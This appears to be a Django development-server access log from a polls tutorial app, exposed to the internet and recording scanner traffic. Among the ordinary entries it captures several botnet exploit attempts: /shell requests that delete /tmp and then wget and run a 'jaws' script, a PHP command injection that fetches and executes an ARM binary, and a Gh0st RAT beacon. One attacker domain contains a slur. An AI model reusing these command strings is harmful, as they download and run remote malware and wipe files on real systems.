+[09/Feb/2020 02:55:36] "HEAD /robots.txt HTTP/1.0" 404 2077
+Not Found: /
+[09/Feb/2020 03:15:29] "GET / HTTP/1.1" 404 2028
+----------------------------------------
+Exception happened during processing of request from ('63.143.35.230', 62815)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[09/Feb/2020 04:01:30] "HEAD /robots.txt HTTP/1.0" 404 2077
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[09/Feb/2020 04:14:25] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 34808)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /shell
+[09/Feb/2020 04:38:32] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://scan.casualaffinity.net/jaws;sh+/tmp/jaws HTTP/1.1" 404 2129
+Not Found: /
+[09/Feb/2020 05:25:31] "GET / HTTP/1.1" 404 2028
+Not Found: /http:/www.speedtest.cn/
+[09/Feb/2020 06:27:04] "HEAD http://www.speedtest.cn/ HTTP/1.1" 404 1689
+Not Found: /http:/tool.chinaz.com/
+[09/Feb/2020 06:27:04] "HEAD http://tool.chinaz.com/ HTTP/1.1" 404 1685
+[09/Feb/2020 06:27:12] code 400, message Bad request syntax ('\x05\x01\x00')
+[09/Feb/2020 06:27:12] " " 400 -
+Not Found: /
+[09/Feb/2020 06:54:55] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[09/Feb/2020 07:53:07] "GET / HTTP/1.1" 404 2028
+Not Found: /
+[09/Feb/2020 09:18:18] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[09/Feb/2020 09:19:01] "GET / HTTP/1.0" 404 2028
+Not Found: /
+[09/Feb/2020 09:30:22] "GET / HTTP/1.1" 404 2030
+----------------------------------------
+Exception happened during processing of request from ('101.251.242.238', 33190)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[09/Feb/2020 09:34:21] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[09/Feb/2020 11:55:58] "GET / HTTP/1.0" 404 2028
+[09/Feb/2020 11:55:59] code 400, message Bad request syntax ("Gh0st\xad\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\tH\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11\xa0\x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯]")
+[09/Feb/2020 11:55:59] "Gh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯]" 400 -
+[09/Feb/2020 11:56:02] code 400, message Bad request syntax ("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+[09/Feb/2020 11:56:02] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 -
+[2020-02-09 11:56:02,318] - Broken pipe from ('165.227.38.57', 53866)
+
+[09/Feb/2020 11:56:04] code 400, message Bad request syntax ('H\x00\x00\x00tj¨\x9e#D\x98+Êð§»lÅ\x19×\x8d¶\x18íJ\x1enÁùxu[lðE\x1d-jìÔxLÉrÉ\x15\x10uà%\x86Rtg\x05fv\x86]%Ì\x80\x0cèÏ®\x00µÀfÈ\x8dDÅ\tô')
+[09/Feb/2020 11:56:04] "H   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô" 400 -
+[09/Feb/2020 11:56:04] code 400, message Bad request syntax ('HELP')
+[09/Feb/2020 11:56:04] "HELP" 400 -
+[09/Feb/2020 11:56:04] code 400, message Bad request syntax ("\x1b\x84Õ°]ôÄ\x93Å0ÂX\x8cÚ±×¬¯n\x1dá\x1e\x1a3*\x85·\x1d'±Ék¿ð¼")
+[09/Feb/2020 11:56:04] "Õ°]ôÄÅ0ÂXÚ±×¬¯ná3*·'±Ék¿ð¼" 400 -
+[09/Feb/2020 11:56:06] code 400, message Bad request syntax ('batman')
+[09/Feb/2020 11:56:06] "batman" 400 -
+[2020-02-09 11:56:06,755] - Broken pipe from ('165.227.38.57', 57076)
+
+[09/Feb/2020 11:56:06] code 400, message Bad request version ('\x9fO)uþ±Ù\x00\x00\x18À\x14À\x13\x005\x00/À')
+[09/Feb/2020 11:56:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2020 11:56:08] code 400, message Bad request syntax ('\x01\x82\x00\x00\x00\x01,ï:ç\x89þH¯¬øÁPq×ÃèS\x8aÖ:\x17Ù3\x14o)S}»»\x97bÎ¶\x0b\x9b¹7>\x01Ïv®\xa0E¶DêáêAÄÛî\t¬ûð\x84)k»c\x18]V\x85VÅ_\x05T\x0btÄ\x0b¾µw¼M=[1á\x06\x9cýÓg^ã\x01\x9bK×ü>ÿk¯\x95\x99ûÛH\x90\x8bD\x88`k\x92õe\x1cª»{_LP\x15\x85\x1e\x0e\x8fÝÅJ')
+[09/Feb/2020 11:56:08] "   ,ï:çþH¯¬øÁPq×ÃèSÖ:Ù3o)S}»»bÎ¶¹7>Ïv® E¶DêáêAÄÛî	¬ûð)k»c]VVÅ_TtÄ¾µw¼M=[1áýÓg^ãK×ü>ÿk¯ûÛHD`kõeª»{_LPÝÅJ" 400 -
+[2020-02-09 11:56:08,973] - Broken pipe from ('165.227.38.57', 58214)
+
+[09/Feb/2020 11:56:09] code 400, message Bad HTTP/0.9 request type ('½ÿ\x9eÿEÿ\x9eÿ½ÿ\x9eÿ¤ÿ\x86ÿÄÿ¾ÿÇÿÛÿîÿx\\d9ÿíÿ¤ÿ\x9dÿÏÿØÿåÿ\x04ÿ\x12ÿ0ÿ±ÿ½ÿçÿâÿÝÿÜÿÞÿÈÿÌÿ¾ÿøÿ&ÿ\x01ÿ\x0fÿõÿ\x06ÿÿÿ÷ÿ!ÿÞÿ\x02ÿ&ÿ')
+[09/Feb/2020 11:56:09] "½ÿÿEÿÿ½ÿÿ¤ÿÿÄÿ¾ÿÇÿÛÿîÿx\d9ÿíÿ¤ÿÿÏÿØÿåÿÿÿ0ÿ±ÿ½ÿçÿâÿÝÿÜÿÞÿÈÿÌÿ¾ÿøÿ&ÿÿÿõÿÿÿÿ÷ÿ!ÿÞÿÿ&ÿÿÿõÿ" 400 -
+Not Found: /
+[09/Feb/2020 11:56:10] "GET / HTTP/1.0" 404 2028
+Not Found: /
+[09/Feb/2020 11:56:12] "OPTIONS / HTTP/1.0" 404 2032
+[09/Feb/2020 11:56:12] code 400, message Bad request version ('?\x90àòt0\\í®¬X\x98ÞJìòÈ\x9clÐ\x9cÀà\x98\x12\x8fçË\x8f¡£\x16ñJ©<½Ú`')
+[09/Feb/2020 11:56:12] "A   fH»d~ügÒÛüîÿ ±¾T¤Z ?àòt0\í®¬XÞJìòÈlÐÀàçË¡£ñJ©<½Ú`" 400 -
+[2020-02-09 11:56:12,203] - Broken pipe from ('165.227.38.57', 59370)
+
+[09/Feb/2020 11:56:13] code 400, message Bad request version ('4]½\x80PVf\x1a\x11¯õÈ£\x16+b±×')
+[09/Feb/2020 11:56:13] "	;Bo3¢Dýsi=®»Æý:óÉ®Ú<0¼8 ÊNûÆÞ·<oN¢õ/í*·C 4]½PVf¯õÈ£+b±×" 400 -
+[2020-02-09 11:56:13,960] - Broken pipe from ('165.227.38.57', 60774)
+
+[09/Feb/2020 11:56:19] code 400, message Bad request version ('RTSP/1.0')
+[09/Feb/2020 11:56:19] "OPTIONS / RTSP/1.0" 400 -
+[09/Feb/2020 11:56:23] code 400, message Bad HTTP/0.9 request type ('l\x00')
+[09/Feb/2020 11:56:23] "l          " 400 -
+[2020-02-09 11:56:23,239] - Broken pipe from ('45.56.99.167', 39018)
+
+Not Found: /nice ports,/Trinity.txt.bak
+[09/Feb/2020 11:56:23] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 2129
+[09/Feb/2020 11:56:26] code 400, message Bad request syntax ('#ST')
+[09/Feb/2020 11:56:26] "#ST" 400 -
+[09/Feb/2020 11:56:28] code 400, message Bad HTTP/0.9 request type ('\x00')
+[09/Feb/2020 11:56:28] " n    beio" 400 -
+[2020-02-09 11:56:28,401] - Broken pipe from ('45.56.99.167', 40674)
+
+[09/Feb/2020 11:56:35] code 400, message Bad request syntax ('\x00\x00\x07\x00\x08\x00\x03\x00\x04\x00\x05\x00\x06')
+[09/Feb/2020 11:56:35] "       " 400 -
+[2020-02-09 11:56:35,600] - Broken pipe from ('45.56.99.167', 41034)
+
+[09/Feb/2020 11:56:51] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+[09/Feb/2020 11:56:51] "  (rþ          |                    " 400 -
+[2020-02-09 11:56:51,321] - Broken pipe from ('45.56.99.167', 44784)
+
+[09/Feb/2020 11:56:53] code 400, message Bad HTTP/0.9 request type ('\x00')
+[09/Feb/2020 11:56:53] "          versionbind   " 400 -
+[2020-02-09 11:56:53,155] - Broken pipe from ('45.56.99.167', 45396)
+
+[09/Feb/2020 11:56:56] code 400, message Bad HTTP/0.9 request type ('\x00')
+[09/Feb/2020 11:56:56] "            " 400 -
+[2020-02-09 11:56:56,290] - Broken pipe from ('45.56.99.167', 45838)
+
+[09/Feb/2020 11:56:56] code 400, message Bad request syntax ('HELP')
+[09/Feb/2020 11:56:56] "HELP" 400 -
+[09/Feb/2020 11:56:57] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+[09/Feb/2020 11:56:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2020 12:21:55] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:21:55] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:22:26] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:22:26] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:22:30] "GET /polls/3/ HTTP/1.1" 200 582
+Not Found: /favicon.ico
+[09/Feb/2020 12:22:30] "GET /favicon.ico HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10924)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[09/Feb/2020 12:57:26] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:57:27] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:57:29] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 12:57:54] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:57:54] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:57:55] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:57:55] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:57:57] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 12:57:59] "POST /polls/1/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 12:57:59] "GET /polls/1/results/ HTTP/1.1" 200 115
+[09/Feb/2020 12:58:03] "GET /polls/1/ HTTP/1.1" 200 342
+[09/Feb/2020 12:58:12] "GET /polls/1/ HTTP/1.1" 200 342
+Not Found: /favicon.ico
+[09/Feb/2020 12:58:13] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:58:21] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:58:21] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:58:23] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 12:58:26] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 12:58:26] "GET /polls/3/results/ HTTP/1.1" 200 216
+[09/Feb/2020 12:58:26] "GET /polls/3/results HTTP/1.1" 301 0
+[09/Feb/2020 12:58:26] "GET /polls/3/results/ HTTP/1.1" 200 216
+[09/Feb/2020 12:58:32] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 12:58:42] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 12:58:42] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 12:58:43] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 12:58:46] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 12:58:46] "GET /polls/3/results/ HTTP/1.1" 200 216
+[09/Feb/2020 12:58:57] "GET /polls/1 HTTP/1.1" 301 0
+[09/Feb/2020 12:58:59] "GET /polls/1/results HTTP/1.1" 301 0
+[09/Feb/2020 12:59:26] "GET /polls/3/results HTTP/1.1" 301 0
+[09/Feb/2020 13:00:16] "GET /polls/3/results HTTP/1.1" 301 0
+[09/Feb/2020 13:00:16] "GET /polls/3/results/ HTTP/1.1" 200 216
+[09/Feb/2020 13:00:31] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 13:00:31] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:00:32] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 13:00:34] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 13:00:35] "GET /polls/3/results/ HTTP/1.1" 200 217
+[09/Feb/2020 13:00:37] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 13:00:41] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 13:00:41] "GET /polls/3/results/ HTTP/1.1" 200 217
+[09/Feb/2020 13:00:47] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 13:00:51] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 13:00:51] "GET /polls/3/results/ HTTP/1.1" 200 217
+[09/Feb/2020 13:00:53] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 13:01:27] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 13:01:27] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:01:30] "GET /polls/3/ HTTP/1.1" 200 582
+[09/Feb/2020 13:01:32] "POST /polls/3/vote/ HTTP/1.1" 302 0
+[09/Feb/2020 13:01:32] "GET /polls/3/results/ HTTP/1.1" 200 217
+[09/Feb/2020 13:01:42] "GET /polls/ HTTP/1.0" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 13:01:42] "GET /favicon.ico HTTP/1.0" 404 2078
+Not Found: /favicon.ico
+[09/Feb/2020 13:01:42] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:01:45] "GET /polls/3/ HTTP/1.0" 200 582
+[09/Feb/2020 13:05:52] "GET /polls/ HTTP/1.1" 200 197
+Not Found: /favicon.ico
+[09/Feb/2020 13:05:53] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:06:00] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 13:06:00] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1915
+[09/Feb/2020 13:06:00] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[09/Feb/2020 13:06:00] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[09/Feb/2020 13:06:00] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[09/Feb/2020 13:06:00] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[09/Feb/2020 13:06:00] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[09/Feb/2020 13:06:00] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+Not Found: /favicon.ico
+[09/Feb/2020 13:06:00] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:06:03] "GET /admin HTTP/1.1" 301 0
+[09/Feb/2020 13:06:03] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 13:06:03] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1915
+[09/Feb/2020 13:06:04] "GET /admin HTTP/1.1" 301 0
+[09/Feb/2020 13:06:04] "GET /admin/ HTTP/1.1" 302 0
+[09/Feb/2020 13:06:04] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1915
+[09/Feb/2020 13:06:04] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[09/Feb/2020 13:06:04] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[09/Feb/2020 13:06:04] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18052
+[09/Feb/2020 13:06:04] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[09/Feb/2020 13:06:04] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[09/Feb/2020 13:06:04] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[09/Feb/2020 13:06:27] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[09/Feb/2020 13:06:27] "GET /admin/ HTTP/1.1" 200 5901
+[09/Feb/2020 13:06:27] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[09/Feb/2020 13:06:27] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[09/Feb/2020 13:06:27] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[09/Feb/2020 13:06:27] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+Not Found: /favicon.ico
+[09/Feb/2020 13:06:27] "GET /favicon.ico HTTP/1.1" 404 2078
+[09/Feb/2020 13:06:27] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[09/Feb/2020 13:06:37] "GET /admin/polls/question/ HTTP/1.1" 200 4615
+[09/Feb/2020 13:06:37] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
+[09/Feb/2020 13:06:37] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6190
+[09/Feb/2020 13:06:37] "GET /admin/jsi18n/ HTTP/1.1" 200 7722
+[09/Feb/2020 13:06:37] "GET /static/admin/js/core.js HTTP/1.1" 200 5723
+[09/Feb/2020 13:06:37] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
+[09/Feb/2020 13:06:37] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
+[09/Feb/2020 13:06:37] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8941
+[09/Feb/2020 13:06:37] "GET /static/admin/js/actions.js HTTP/1.1" 200 6766
+[09/Feb/2020 13:06:37] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 280364
+[09/Feb/2020 13:06:37] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
+[09/Feb/2020 13:06:38] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+Not Found: /favicon.ico
+[09/Feb/2020 13:06:38] "GET /favicon.ico HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10934)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10933)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10936)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10935)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10938)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('223.104.190.233', 10937)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[09/Feb/2020 13:39:44] "GET / HTTP/1.1" 404 2028
+Not Found: /shell
+[09/Feb/2020 14:08:21] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 2154
+Not Found: /shell
+[09/Feb/2020 14:08:22] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdjahsdjasfkdaskdfasBOT.niggacumyafacenet.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 2154
+Not Found: /
+[09/Feb/2020 14:44:40] "GET / HTTP/1.1" 404 2027
+[09/Feb/2020 17:12:29] code 400, message Bad request syntax ('GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1')
